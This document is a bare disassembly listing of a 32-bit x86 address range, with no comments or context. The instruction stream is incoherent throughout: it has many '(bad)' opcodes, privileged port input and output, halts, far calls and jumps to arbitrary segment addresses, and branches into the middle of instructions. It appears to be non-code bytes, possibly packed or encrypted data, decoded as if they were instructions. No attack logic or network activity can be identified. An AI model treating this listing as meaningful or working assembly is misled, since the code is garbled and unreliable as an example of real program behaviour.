  410860:	sbb    al,0xba
  410862:	cmpps  xmm3,xmm3,0x2c
  410866:	mov    ebx,0x57eb09ae
  41086b:	jns    0x4107ef
  41086d:	cmp    DWORD PTR [ecx*8+0x3435f634],0x9afd8255
  410878:	push   ebp
  410879:	sub    edi,DWORD PTR [esi-0x74]
  41087c:	sbb    BYTE PTR [eax],dl
  41087e:	rol    DWORD PTR [eax-0x197b5d88],0xe1
  410885:	pop    ss
  410886:	div    dl
  410888:	mov    al,ds:0xd3587ab8
  41088d:	hlt    
  41088e:	or     al,0x35
  410890:	or     al,0xc3
  410892:	sub    dh,bh
  410894:	pop    esi
  410895:	pusha  
  410896:	aaa    
  410897:	inc    ebx
  410898:	out    0x50,ax
  41089b:	mov    eax,ds:0xa18a21e2
  4108a0:	jne    0x410833
  4108a2:	fcomp  DWORD PTR ds:[ebx+0x5ee69e27]
  4108a9:	dec    eax
  4108aa:	add    BYTE PTR [esp+edx*4-0x13],dh
  4108ae:	fs add al,0xd0
  4108b1:	fstp   QWORD PTR [edx]
  4108b3:	mov    eax,0xe13871c4
  4108b8:	pop    esp
  4108b9:	sbb    al,0xe3
  4108bb:	push   edx
  4108bc:	sub    al,0xc7
  4108be:	pop    ecx
  4108bf:	fmul   st,st(7)
  4108c1:	jle    0x4108c3
  4108c3:	(bad)  
  4108c4:	in     eax,0x53
  4108c6:	pop    ds
  4108c7:	xchg   esp,eax
  4108c8:	mov    esp,0x481044fe
  4108cd:	ja     0x4108a2
  4108cf:	adc    DWORD PTR [esi-0x76],ebp
  4108d2:	out    0x2b,al
  4108d4:	mov    ebx,edx
  4108d6:	(bad)  
  4108d7:	fcom   DWORD PTR ds:0xc19bc06b
  4108dd:	fs mov dl,0x6d
  4108e0:	sar    ebp,cl
  4108e2:	mov    ch,0x7b
  4108e4:	inc    ecx
  4108e5:	xchg   ebx,eax
  4108e6:	ins    DWORD PTR es:[edi],dx
  4108e7:	outs   dx,DWORD PTR ds:[esi]
  4108e8:	sub    eax,0xd8bcc1a2
  4108ed:	adc    ebx,DWORD PTR [ebx-0x11996656]
  4108f3:	lock iret 
  4108f5:	ja     0x410892
  4108f7:	nop
  4108f8:	aad    0xe3
  4108fa:	xor    esi,ebx
  4108fc:	sbb    al,0x47
  4108fe:	idiv   DWORD PTR [eax]
  410900:	popf   
  410901:	sub    BYTE PTR [edi-0x33],al
  410904:	enter  0x282d,0x94
  410908:	add    ebp,0xffffffdf
  41090b:	cmp    eax,0x6fcc0d5
  410910:	fsub   DWORD PTR [ecx]
  410912:	pop    eax
  410913:	cld    
  410914:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410915:	mov    edx,0xe9acb86b
  41091a:	mov    bl,0x7f
  41091c:	mov    esp,0x7e7d76fb
  410921:	cmp    eax,0x80879f
  410926:	xor    DWORD PTR [edx],edx
  410928:	pop    edx
  410929:	mov    cs:0xa9e6f64f,al
  41092f:	inc    edx
  410930:	dec    ebx
  410931:	ins    BYTE PTR es:[edi],dx
  410932:	call   0xa552c333
  410937:	into   
  410938:	adc    BYTE PTR [eax+0x79a77903],cl
  41093e:	(bad)  [ebx+ebp*2]
  410941:	test   edx,ecx
  410943:	dec    esp
  410944:	cmp    al,0x4a
  410946:	sahf   
  410947:	fs stos DWORD PTR es:[edi],eax
  410949:	push   0xf595deeb
  41094e:	cmp    ecx,DWORD PTR [ebx-0x22a86caa]
  410954:	fidivr WORD PTR [ebp+0x2a517b48]
  41095a:	cmc    
  41095b:	mov    cl,0x6d
  41095d:	push   eax
  41095e:	xchg   edx,eax
  41095f:	push   ss
  410960:	xchg   esp,eax
  410961:	push   ebx
  410962:	loop   0x4108f4
  410964:	les    eax,FWORD PTR [ebp+0x5e]
  410967:	nop
  410968:	add    BYTE PTR [eax-0x40],ah
  41096b:	pusha  
  41096c:	imul   edx,ebx,0xafcf4f24
  410972:	mov    DWORD PTR [edi-0x6f],eax
  410975:	adc    BYTE PTR [edx],0x6b
  410978:	loopne 0x410958
  41097a:	dec    edi
  41097b:	in     eax,0xae
  41097d:	in     al,dx
  41097e:	mov    edi,0x4f195d9f
  410983:	lds    ebp,FWORD PTR [ecx+0xe816f45]
  410989:	loop   0x4109aa
  41098b:	pop    esp
  41098c:	push   0xf01007ce
  410991:	xor    ebp,DWORD PTR [ebp+0x5ba2c451]
  410997:	or     al,0x83
  410999:	outs   dx,BYTE PTR ds:[esi]
  41099a:	xor    DWORD PTR [edx-0x4ba6bbb8],esp
  4109a0:	adc    esp,edi
  4109a2:	pop    esp
  4109a3:	fbld   TBYTE PTR [edx+0x52dd3fce]
  4109a9:	loopne 0x4109d0
  4109ab:	xor    bl,BYTE PTR [edi]
  4109ad:	out    0x79,eax
  4109af:	loop   0x4109d7
  4109b1:	cdq    
  4109b2:	push   cs
  4109b3:	(bad)  
  4109b4:	mov    BYTE PTR [ebp+0x1],0x7d
  4109b8:	or     eax,DWORD PTR [ebx-0x12af2f4e]
  4109be:	aaa    
  4109bf:	fadd   DWORD PTR [edx]
  4109c1:	mov    ah,0xa2
  4109c3:	xchg   BYTE PTR [eax],bh
  4109c5:	cld    
  4109c6:	mov    dl,0x88
  4109c8:	les    esp,FWORD PTR [edx]
  4109ca:	inc    ebx
  4109cb:	push   ss
  4109cc:	push   edx
  4109cd:	pop    es
  4109ce:	mov    ds:0x7f42e904,eax
  4109d3:	sar    BYTE PTR [eax],1
  4109d5:	jae    0x410997
  4109d7:	cmp    BYTE PTR [edx+0x13202f8],bh
  4109dd:	in     al,dx
  4109de:	int    0x10
  4109e0:	(bad)  
  4109e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109e3:	push   esp
  4109e4:	sub    edi,edx
  4109e6:	iret   
  4109e7:	mov    eax,0x46fb7106
  4109ec:	fwait
  4109ed:	dec    esi
  4109ee:	jp     0x4109d4
  4109f0:	jnp    0x410a27
  4109f2:	xor    edi,ebp
  4109f4:	call   0xc965:0x31f12b1a
  4109fb:	sub    DWORD PTR [edx],ebp
  4109fd:	daa    
  4109fe:	sbb    BYTE PTR [edx+0x79f89ea9],al
  410a04:	je     0x4109fe
  410a06:	test   BYTE PTR [ebp+0x54],ah
  410a09:	jae    0x41099d
  410a0b:	int3   
  410a0c:	lea    ebx,[edi]
  410a0e:	add    BYTE PTR [ecx],al
  410a10:	pop    esi
  410a11:	jge    0x4109fd
  410a13:	dec    edi
  410a14:	sbb    eax,0x212dab56
  410a19:	add    eax,0xfef106ea
  410a1e:	and    al,0x14
  410a20:	pop    ecx
  410a21:	cld    
  410a22:	xchg   ebx,eax
  410a23:	pop    es
  410a24:	outs   dx,DWORD PTR ds:[esi]
  410a25:	dec    eax
  410a26:	nop
  410a27:	jbe    0x410a3f
  410a29:	xor    ah,dl
  410a2b:	mov    ebp,edx
  410a2d:	leave  
  410a2e:	out    0x52,eax
  410a30:	mov    bl,0x21
  410a32:	dec    ecx
  410a33:	pop    ds
  410a34:	fcom   QWORD PTR [eax-0x57392fff]
  410a3a:	sahf   
  410a3b:	sahf   
  410a3c:	ins    DWORD PTR es:[edi],dx
  410a3d:	sub    DWORD PTR [edi],esi
  410a3f:	and    eax,0x3effe434
  410a44:	sbb    DWORD PTR [eax],0x5f6997f4
  410a4a:	loop   0x410a6d
  410a4c:	rol    BYTE PTR [esi-0x6802f0f6],cl
  410a52:	test   BYTE PTR [edx+0x238e506a],0x8a
  410a59:	enter  0x18dc,0x5e
  410a5d:	fld    st(5)
  410a5f:	pop    edi
  410a60:	sbb    al,0x6e
  410a62:	(bad)  
  410a63:	mov    BYTE PTR [eax+0x5d],0xfd
  410a67:	and    al,0x51
  410a69:	pop    es
  410a6a:	leave  
  410a6b:	pop    edx
  410a6c:	lea    edx,[edi+0x29]
  410a6f:	test   BYTE PTR [esi],ah
  410a71:	add    DWORD PTR ds:0x39de1f0b,edx
  410a77:	out    0x37,eax
  410a79:	pop    ebp
  410a7a:	cmp    eax,0x9c8a418d
  410a7f:	pop    ds
  410a80:	jge    0x410a02
  410a82:	jo     0x410a95
  410a84:	ja     0x410a62
  410a86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a87:	add    ecx,DWORD PTR [ebx-0x77c9a7f9]
  410a8d:	int    0x3e
  410a8f:	mov    eax,ds:0x4836a73
  410a94:	jp     0x410a7c
  410a96:	mov    edx,DWORD PTR ds:0xca424317
  410a9c:	rcr    DWORD PTR [ecx],0xf0
  410a9f:	arpl   WORD PTR [ebp+0x44c1b6e9],ax
  410aa5:	cmp    ah,BYTE PTR [eax+0x79]
  410aa8:	mov    eax,0x30d6cebf
  410aad:	xor    BYTE PTR ds:0x113279f4,cl
  410ab3:	fsub   QWORD PTR [edi+0x1e52d633]
  410ab9:	jb     0x410b20
  410abb:	retf   0xb261
  410abe:	in     eax,0x7e
  410ac0:	cmc    
  410ac1:	sbb    edi,esp
  410ac3:	inc    ebp
  410ac4:	in     al,dx
  410ac5:	iret   
  410ac6:	test   al,0x67
  410ac8:	popf   
  410ac9:	call   0xe34c:0x41092929
  410ad0:	jno    0x410a8b
  410ad2:	sub    esi,DWORD PTR [ecx+ecx*8-0x68]
  410ad6:	dec    edi
  410ad7:	mov    edi,0xd669940a
  410adc:	repz (bad) 
  410ade:	mov    fs,WORD PTR [esi+0x3f]
  410ae1:	lock or DWORD PTR [esi],esp
  410ae4:	popa   
  410ae5:	mov    eax,ds:0x9c87f030
  410aea:	jp     0x410b23
  410aec:	out    dx,eax
  410aed:	lods   al,BYTE PTR ds:[esi]
  410aee:	add    DWORD PTR [eax-0x63f36c14],eax
  410af4:	cmp    al,al
  410af6:	jae    0x410abf
  410af8:	cli    
  410af9:	pop    eax
  410afa:	jp     0x410af4
  410afc:	out    dx,eax
  410afd:	repnz mov eax,ds:0xd7d4393c
  410b03:	xor    al,0xe
  410b05:	pop    ss
  410b06:	out    0xdf,eax
  410b08:	fld    TBYTE PTR [edi]
  410b0a:	xchg   esi,eax
  410b0b:	sub    al,0xf6
  410b0d:	call   0xc462:0x3207f330
  410b14:	gs push ds
  410b16:	mov    bl,0x37
  410b18:	mov    ds:0x61f0d751,al
  410b1d:	(bad)  [esi-0x77954c2e]
  410b23:	jns    0x410afb
  410b25:	lds    edi,FWORD PTR [ebx+edi*2+0x53369c17]
  410b2c:	jecxz  0x410ba1
  410b2e:	mov    esp,edx
  410b30:	push   ebp
  410b31:	aam    0xb3
  410b33:	adc    al,bl
  410b35:	cld    
  410b36:	repz cmp BYTE PTR [ebx+0x22732721],0x4
  410b3e:	add    cl,BYTE PTR [ecx+eiz*2]
  410b41:	test   eax,0x749266c3
  410b46:	push   esi
  410b47:	into   
  410b48:	lods   al,BYTE PTR ds:[esi]
  410b49:	mov    eax,0x2fcabecb
  410b4e:	addr16 out dx,al
  410b50:	ss lahf 
  410b52:	(bad)  
  410b53:	jmp    0x410bd2
  410b55:	pop    ebx
  410b56:	xchg   edi,eax
  410b57:	sub    dl,dh
  410b59:	aad    0x7f
  410b5b:	call   0xb2b6e29f
  410b60:	clc    
  410b61:	fadd   DWORD PTR [ebx+0x2606ee59]
  410b67:	int3   
  410b68:	fcmove st,st(3)
  410b6a:	js     0x410ba1
  410b6c:	clc    
  410b6d:	jae    0x410b58
  410b6f:	cmp    BYTE PTR [ecx+0xd],bl
  410b72:	adc    BYTE PTR [eax-0x4bdd949d],0xc2
  410b79:	sub    DWORD PTR [edi-0x6d],eax
  410b7c:	adc    BYTE PTR [edi+0x1b592aa0],dl
  410b82:	je     0x410bca
  410b84:	cli    
  410b85:	cmp    BYTE PTR [eax+0x74401e6],dl
  410b8b:	adc    al,0x5a
  410b8d:	adc    dl,al
  410b8f:	adc    edi,0xd8528b6a
  410b95:	sbb    BYTE PTR [ecx-0x1767b82d],0x19
  410b9c:	stos   DWORD PTR es:[edi],eax
  410b9d:	into   
  410b9e:	xchg   DWORD PTR [esi+0x60],ebp
  410ba1:	jmp    0x410b49
  410ba3:	push   0x22a4fddd
  410ba8:	aad    0x4f
  410baa:	jnp    0x410bc0
  410bac:	int    0x24
  410bae:	xchg   esp,eax
  410baf:	inc    esp
  410bb0:	js     0x410bd4
  410bb2:	inc    ebp
  410bb3:	cld    
  410bb4:	inc    esp
  410bb5:	mov    dh,0xc3
  410bb7:	ins    BYTE PTR es:[edi],dx
  410bb8:	lods   eax,DWORD PTR ds:[esi]
  410bb9:	jg     0x410bbd
  410bbb:	inc    esp
  410bbc:	pop    ds
  410bbd:	sub    esp,esi
  410bbf:	pop    ebx
  410bc0:	add    DWORD PTR [edi+0x21717112],ecx
  410bc6:	mov    ebx,0x422c9e4e
  410bcb:	or     bl,BYTE PTR [ebp+ecx*1-0x19]
  410bcf:	clc    
  410bd0:	mov    ?,WORD PTR [eax+eiz*4-0x1f]
  410bd4:	in     eax,0xa4
  410bd6:	and    DWORD PTR [esi+0x43],edx
  410bd9:	retf   0x6e77
  410bdc:	(bad)  
  410bdd:	adc    eax,0x15093db5
  410be2:	pop    ecx
  410be3:	nop
  410be4:	outs   dx,DWORD PTR ds:[esi]
  410be5:	out    dx,eax
  410be6:	xor    ecx,DWORD PTR [eax-0x120725d4]
  410bec:	sbb    eax,0x74ef40f
  410bf1:	aaa    
  410bf2:	sub    al,0xc4
  410bf5:	hlt    
  410bf6:	(bad)  [ecx-0x61]
  410bf9:	dec    ebp
  410bfa:	xor    esp,DWORD PTR [esi-0x73a558cf]
  410c00:	mov    bh,ah
  410c02:	mov    bl,0x30
  410c04:	mov    ds:0x27ebd47f,eax
  410c09:	test   BYTE PTR ds:0x9c4d51cc,al
  410c0f:	sub    ah,BYTE PTR [ebx]
  410c11:	jno    0x410bc3
  410c13:	add    eax,DWORD PTR [eax]
  410c15:	(bad)  
  410c16:	cmc    
  410c17:	add    ch,BYTE PTR [esi+0x7875196f]
  410c1d:	ja     0x410bef
  410c1f:	loope  0x410c8e
  410c21:	in     al,dx
  410c22:	push   cs
  410c23:	xchg   esp,eax
  410c24:	xchg   ebp,eax
  410c25:	add    BYTE PTR [ebp+ecx*2-0x4e821165],0x51
  410c2d:	stc    
  410c2e:	les    eax,FWORD PTR [ecx+0x5cd815d1]
  410c34:	xchg   edi,eax
  410c35:	mov    ds:0xe74e4164,eax
  410c3a:	(bad)  
  410c3d:	sbb    BYTE PTR [ebp+0x4a961a1d],al
  410c43:	fisttp DWORD PTR [ebx]
  410c45:	adc    bh,0x89
  410c48:	mov    al,0x7
  410c4a:	adc    DWORD PTR [edx+0x4e],edi
  410c4d:	inc    ebp
  410c4e:	idiv   DWORD PTR [ebp+0x6da6b096]
  410c54:	or     ah,BYTE PTR [ecx]
  410c56:	jmp    0x14621a1f
  410c5b:	pop    ss
  410c5c:	cli    
  410c5d:	fstp   QWORD PTR [edi]
  410c5f:	push   es
  410c60:	xchg   ebp,eax
  410c61:	pop    ss
  410c62:	leave  
  410c63:	adc    al,0xbb
  410c65:	ja     0x410c48
  410c67:	test   eax,0x8bae142b
  410c6c:	pop    eax
  410c6d:	xor    ebp,DWORD PTR [eax+edi*2+0x42]
  410c71:	inc    edi
  410c72:	into   
  410c73:	mov    bh,0xb1
  410c75:	test   DWORD PTR [edx*4-0x699645a8],ebx
  410c7c:	add    eax,0x270a8111
  410c81:	jmp    0xbd28:0xea320411
  410c88:	xchg   esp,eax
  410c89:	xchg   ebx,eax
  410c8a:	retf   
  410c8b:	rcl    esp,0x36
  410c8e:	xlat   BYTE PTR ds:[ebx]
  410c8f:	cmp    edx,esp
  410c91:	jge    0x410c4e
  410c93:	pop    ds
  410c94:	mov    ds:0x49581092,eax
  410c99:	aad    0x31
  410c9b:	mov    esp,0xc0d8d7cf
  410ca0:	mov    bl,0xc6
  410ca2:	inc    eax
  410ca3:	mul    DWORD PTR [ebp-0x710c581c]
  410ca9:	sar    BYTE PTR [ecx+0x72697067],cl
  410caf:	sub    eax,0x96485618
  410cb4:	mov    bl,0x1
  410cb6:	push   edi
  410cb7:	and    DWORD PTR [edx],eax
  410cb9:	mov    ds:0xb1ecca15,eax
  410cbe:	pop    esp
  410cbf:	pop    edx
  410cc0:	push   eax
  410cc1:	mov    edi,DWORD PTR [edi-0x62]
  410cc4:	cmp    DWORD PTR ds:0x4d3afe2b,eax
  410cca:	inc    cl
  410ccc:	shr    ebx,0xf4
  410ccf:	out    dx,al
  410cd0:	push   edx
  410cd1:	outs   dx,DWORD PTR ds:[esi]
  410cd2:	repnz mov BYTE PTR [edi+0x67],cl
  410cd6:	jle    0x410cc8
  410cd8:	test   dh,cl
  410cda:	sbb    al,0xb5
  410cdc:	lods   al,BYTE PTR ds:[esi]
  410cdd:	mov    dh,0xce
  410cdf:	test   al,0x6b
  410ce1:	sti    
  410ce2:	push   ebp
  410ce3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ce4:	pop    ss
  410ce5:	aam    0x5c
  410ce7:	lock idiv BYTE PTR [edi]
  410cea:	fisubr DWORD PTR ds:0x1e8b0478
  410cf0:	ret    0xf5f9
  410cf3:	adc    BYTE PTR [ecx],ch
  410cf5:	mov    dl,0x9b
  410cf7:	pop    edi
  410cf8:	clc    
  410cf9:	or     eax,0x79026045
  410cfe:	test   esi,0x1f974bfb
  410d04:	fbstp  TBYTE PTR [ecx-0xc5955d0]
  410d0a:	mov    ch,bh
  410d0c:	stos   BYTE PTR es:[edi],al
  410d0d:	shl    BYTE PTR [esi+ecx*1],0xb4
  410d11:	or     al,0x43
  410d13:	popa   
  410d14:	pop    eax
  410d15:	sar    ebp,1
  410d17:	mov    al,ds:0x345f3f67
  410d1c:	add    esp,ecx
  410d1e:	push   esi
  410d1f:	iret   
  410d20:	ret    0xbc99
  410d23:	nop
  410d24:	jne    0x410cab
  410d26:	jns    0x410da4
  410d28:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  410d2a:	push   edx
  410d2b:	xlat   BYTE PTR ds:[ebx]
  410d2c:	out    0x57,eax
  410d2e:	aaa    
  410d2f:	mov    al,bl
  410d31:	in     al,0xee
  410d33:	xor    eax,0x49b779d0
  410d38:	cmp    ebp,eax
  410d3a:	xchg   ebx,eax
  410d3b:	push   esp
  410d3c:	mov    gs,WORD PTR [edx+0x79]
  410d3f:	pop    edx
  410d40:	or     DWORD PTR [esi-0x2bf87222],esi
  410d46:	mov    al,0x64
  410d48:	inc    edi
  410d49:	mov    edi,0x36fd2cb4
  410d4e:	inc    edx
  410d4f:	mov    esi,0x7fe30d22
  410d54:	and    bh,BYTE PTR [ecx+edx*2]
  410d57:	inc    esi
  410d58:	popa   
  410d59:	or     ah,BYTE PTR [eax+0x2]
  410d5c:	std    
  410d5d:	bound  esi,QWORD PTR [edx+eiz*8+0x9]
  410d61:	(bad)  
  410d62:	stos   BYTE PTR es:[edi],al
  410d63:	hlt    
  410d64:	in     al,0x96
  410d66:	stos   DWORD PTR es:[edi],eax
  410d67:	clc    
  410d68:	pop    ss
  410d69:	data16 jne 0x410d18
  410d6c:	inc    esp
  410d6d:	pop    esi
  410d6e:	lods   al,BYTE PTR ds:[esi]
  410d6f:	cli    
  410d70:	adc    DWORD PTR ds:[ecx+0x47566ce8],ebx
  410d77:	mov    esp,0x44f97dc0
  410d7c:	push   cs
  410d7d:	xlat   BYTE PTR ds:[ebx]
  410d7e:	cmp    eax,0xa948901f
  410d83:	pop    esp
  410d84:	mov    ebx,0x36d1efd5
  410d89:	xlat   BYTE PTR ds:[ebx]
  410d8a:	inc    ebx
  410d8b:	mov    bh,0x8
  410d8d:	jg     0x410dd8
  410d8f:	mov    dl,0x58
  410d91:	arpl   dx,si
  410d93:	push   ds
  410d94:	fnstenv [ebp+0x5]
  410d97:	test   BYTE PTR [esp+ecx*8-0x4fd48fa3],dl
  410d9e:	and    eax,0x3e48775d
  410da3:	cld    
  410da4:	jnp    0x410e1a
  410da6:	int    0x2f
  410da8:	push   esp
  410da9:	int3   
  410daa:	mov    ch,0xe6
  410dac:	fstp   DWORD PTR [eax-0x71b6f900]
  410db2:	jg     0x410d71
  410db4:	(bad)  
  410db5:	sar    BYTE PTR [edi],1
  410db7:	stos   DWORD PTR es:[edi],eax
  410db8:	fist   WORD PTR [eax-0x2e]
  410dbb:	and    ch,al
  410dbd:	sahf   
  410dbe:	shl    BYTE PTR [ecx-0x65],1
  410dc1:	xchg   ebx,eax
  410dc2:	sub    ah,ch
  410dc4:	and    eax,DWORD PTR [edi+ebp*4+0x58a14dd4]
  410dcb:	fnclex 
  410dcd:	mov    dh,0xe1
  410dcf:	rcl    DWORD PTR [esp+ecx*2],0x9e
  410dd3:	fcom   QWORD PTR [eax]
  410dd5:	mov    ebp,edi
  410dd7:	mov    WORD PTR [ebp+0xf],ds
  410dda:	sbb    ebp,DWORD PTR [edi]
  410ddc:	jbe    0x410d8f
  410dde:	(bad)  
  410de0:	fild   QWORD PTR [ebx]
  410de2:	repnz and ch,BYTE PTR [ebx+0xa]
  410de6:	xchg   DWORD PTR [esi-0x2199165d],edx
  410dec:	sbb    ebx,DWORD PTR [edi+0x44653da9]
  410df2:	jl     0x410dee
  410df4:	mov    bl,0x72
  410df6:	lea    eax,[eax]
  410df8:	int    0xf
  410dfa:	shl    BYTE PTR [ecx+0x2ec1a50d],0xcd
  410e01:	ins    DWORD PTR es:[edi],dx
  410e02:	xor    BYTE PTR [ebp-0x6a],ah
  410e05:	cmp    esp,DWORD PTR [esi-0x34bfc5ec]
  410e0b:	xchg   esp,eax
  410e0c:	stos   DWORD PTR es:[edi],eax
  410e0d:	mov    WORD PTR ds:0xa9cc3ba8,fs
  410e13:	and    eax,DWORD PTR [ebp-0x3b]
  410e16:	mov    BYTE PTR [edi],bl
  410e18:	imul   esp,DWORD PTR [esi],0xffffff90
  410e1b:	loop   0x410df7
  410e1d:	lock aaa 
  410e1f:	call   0xb2f5894d
  410e24:	gs mov bl,ch
  410e27:	xchg   esi,eax
  410e28:	adc    al,0x17
  410e2a:	aam    0x76
  410e2c:	sar    BYTE PTR [esi-0x16],cl
  410e2f:	fisttp QWORD PTR [edi]
  410e31:	mov    bl,0xec
  410e33:	lea    ebx,[ebx-0x908c954]
  410e39:	std    
  410e3a:	jne    0x410ea4
  410e3c:	pop    esp
  410e3d:	(bad)  
  410e3f:	cwde   
  410e40:	arpl   si,cx
  410e42:	outs   dx,DWORD PTR ds:[esi]
  410e43:	jbe    0x410de9
  410e45:	pop    edx
  410e46:	lock xchg ebx,eax
  410e48:	lea    esp,[edi-0x54ac2cb]
  410e4e:	test   DWORD PTR fs:[eax],esi
  410e51:	scas   eax,DWORD PTR es:[edi]
  410e52:	in     al,dx
  410e53:	mov    ah,0x23
  410e55:	adc    al,0xd6
  410e57:	and    DWORD PTR [eax],0x8723731e
  410e5d:	push   0x5240fdcf
  410e62:	pop    es
  410e63:	in     al,dx
  410e64:	ret    0xbb3c
  410e67:	in     al,0xc
  410e69:	in     eax,0x6a
  410e6b:	adc    BYTE PTR [edi+0x5df7a6fb],0x4a
  410e72:	into   
  410e73:	inc    esi
  410e74:	inc    esi
  410e75:	mov    ds:0x34becacc,eax
  410e7a:	data16 in al,dx
  410e7c:	leave  
  410e7d:	fisub  WORD PTR [ecx]
  410e7f:	jnp    0x410e18
  410e81:	dec    ecx
  410e82:	mov    ch,0x6
  410e84:	or     DWORD PTR [esi-0x39],ebx
  410e87:	dec    ecx
  410e88:	mov    dl,0x78
  410e8a:	sbb    eax,DWORD PTR [edi-0xf73ed62]
  410e90:	mov    BYTE PTR [eax-0x83b754b],ah
  410e96:	push   edi
  410e97:	(bad)  
  410e98:	ds pop esp
  410e9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e9b:	push   cs
  410e9c:	sub    edi,esp
  410e9e:	pop    es
  410e9f:	icebp  
  410ea0:	in     al,dx
  410ea1:	push   eax
  410ea2:	pop    edi
  410ea3:	sbb    BYTE PTR [eax-0x13545e0b],0x7d
  410eaa:	cmp    al,BYTE PTR [esp+edx*8]
  410ead:	dec    esi
  410eae:	dec    edx
  410eaf:	inc    edx
  410eb0:	ds jb  0x410e45
  410eb3:	imul   esi,DWORD PTR [eax],0x91f30950
  410eb9:	pop    eax
  410eba:	mov    ebp,edx
  410ebc:	popf   
  410ebd:	je     0x410f05
  410ebf:	lods   eax,DWORD PTR ds:[esi]
  410ec0:	xchg   esp,eax
  410ec1:	cmp    BYTE PTR [edx],cl
  410ec3:	mov    ds:0x84e085c2,al
  410ec8:	mov    edx,0xc773bd2f
  410ecd:	add    al,0x8f
  410ecf:	imul   BYTE PTR [ecx-0x38]
  410ed2:	ja     0x410f32
  410ed4:	jle    0x410f0e
  410ed6:	push   0xfffffff3
  410ed8:	loop   0x410e99
  410eda:	(bad)  
  410edb:	and    bh,BYTE PTR [eax]
  410edd:	es pusha 
  410edf:	push   esp
  410ee0:	inc    ebx
  410ee1:	or     eax,0x98e8968e
  410ee6:	test   BYTE PTR ds:0xd44bdc88,ch
  410eec:	leave  
  410eed:	mov    edi,0x4c48dc01
  410ef2:	cli    
  410ef3:	inc    edx
  410ef4:	pop    edi
  410ef5:	xchg   ecx,eax
  410ef6:	cmp    BYTE PTR [ebx],0x2c
  410ef9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410efa:	inc    edx
  410efb:	aas    
  410efc:	call   0xa6f9113a
  410f01:	sbb    edi,DWORD PTR [ecx-0x39847215]
  410f07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f08:	ds cmp DWORD PTR ss:[bx-0x7524],edi
  410f0f:	sbb    BYTE PTR [ecx-0x74],dl
  410f12:	mov    dh,0x68
  410f14:	xchg   ebx,eax
  410f15:	jmp    0x679a:0x797ee197
  410f1c:	xlat   BYTE PTR ds:[ebx]
  410f1d:	pusha  
  410f1e:	in     eax,0xbb
  410f20:	mov    cl,0xfd
  410f22:	xor    esp,edx
  410f24:	(bad)  
  410f25:	stos   BYTE PTR es:[edi],al
  410f26:	xor    ch,BYTE PTR [esi-0xf3adc68]
  410f2c:	arpl   sp,cx
  410f2e:	leave  
  410f2f:	ins    DWORD PTR es:[edi],dx
  410f30:	jns    0x410ee5
  410f32:	ror    BYTE PTR [ebx+0x54],cl
  410f35:	hlt    
  410f36:	sahf   
  410f37:	push   0x955405ee
  410f3c:	imul   ebp,esp,0x4
  410f3f:	or     eax,0x39bb99ac
  410f44:	lea    esi,[eax-0xf62705f]
  410f4a:	outs   dx,BYTE PTR ds:[esi]
  410f4b:	icebp  
  410f4c:	adc    dh,BYTE PTR [esi]
  410f4e:	out    dx,eax
  410f4f:	leave  
  410f50:	or     al,0xb
  410f52:	stc    
  410f53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f55:	cli    
  410f56:	jae    0x410fb2
  410f58:	push   0xfffffff7
  410f5a:	in     al,0x3d
  410f5c:	sbb    BYTE PTR [edi-0x5cf2f824],bh
  410f62:	pop    esp
  410f63:	sahf   
  410f64:	fsub   QWORD PTR [edi+0x46]
  410f67:	jno    0x410f0e
  410f69:	test   BYTE PTR [ecx+ebx*1-0x6d],ah
  410f6d:	lds    esp,FWORD PTR [edx-0x50]
  410f70:	sahf   
  410f71:	(bad)  
  410f73:	ret    0x7af6
  410f76:	stos   DWORD PTR es:[edi],eax
  410f77:	in     al,dx
  410f78:	push   ebp
  410f79:	orps   xmm7,XMMWORD PTR [ebp+0x68]
  410f7d:	bndstx [ecx+0x6f67529f],(bad)
  410f84:	push   edi
  410f85:	jb     0x410f98
  410f87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f88:	nop
  410f89:	or     al,0x27
  410f8b:	mov    al,0xb6
  410f8d:	xor    al,0x38
  410f8f:	add    al,0xf5
  410f91:	scas   eax,DWORD PTR es:[edi]
  410f92:	or     ch,dh
  410f94:	shl    DWORD PTR [edx-0x13],cl
  410f97:	mov    WORD PTR [eax+ebx*4+0x31],?
  410f9b:	repz inc edi
  410f9d:	enter  0xdf5b,0xfc
  410fa1:	pop    ecx
  410fa2:	sti    
  410fa3:	into   
  410fa4:	outs   dx,DWORD PTR ds:[esi]
  410fa5:	out    dx,eax
  410fa6:	jl     0x410f89
  410fa8:	xor    DWORD PTR gs:[ecx-0x1d5c355],esp
  410faf:	inc    esi
  410fb0:	sbb    ebp,DWORD PTR [eax-0x5c]
  410fb3:	jb     0x411004
  410fb5:	mov    ebp,DWORD PTR [ebp-0x5e]
  410fb8:	gs push bx
  410fbb:	outs   dx,DWORD PTR ds:[esi]
  410fbc:	xchg   edx,eax
  410fbd:	(bad)  
  410fbf:	in     al,dx
  410fc0:	fidivr WORD PTR [esi+0x42527b51]
  410fc6:	stc    
  410fc7:	jecxz  0x41100f
  410fc9:	xchg   esi,eax
  410fca:	push   0x7a
  410fcc:	add    al,0xac
  410fce:	cmp    ch,BYTE PTR [eax+ebp*2+0x4e296fd4]
  410fd5:	mov    ebx,0x8aab5855
  410fda:	adc    BYTE PTR [ebx],ch
  410fdc:	stos   DWORD PTR es:[edi],eax
  410fdd:	call   0x68d7:0xc383372a
  410fe4:	gs push cs
  410fe6:	ja     0x410ff0
  410fe8:	mov    bh,0xa0
  410fea:	(bad)  
  410feb:	adc    eax,0x6a0854b
  410ff0:	mov    al,0x90
  410ff2:	aaa    
  410ff3:	hlt    
  410ff4:	mov    al,ds:0x20789d89
  410ff9:	cmp    al,0xf8
  410ffb:	scas   al,BYTE PTR es:[edi]
  410ffc:	test   al,0xbc
  410ffe:	pop    ecx
  410fff:	inc    edx
  411000:	stos   BYTE PTR es:[edi],al
  411001:	in     eax,dx
  411002:	jne    0x411011
  411004:	mov    eax,0x72541b10
  411009:	daa    
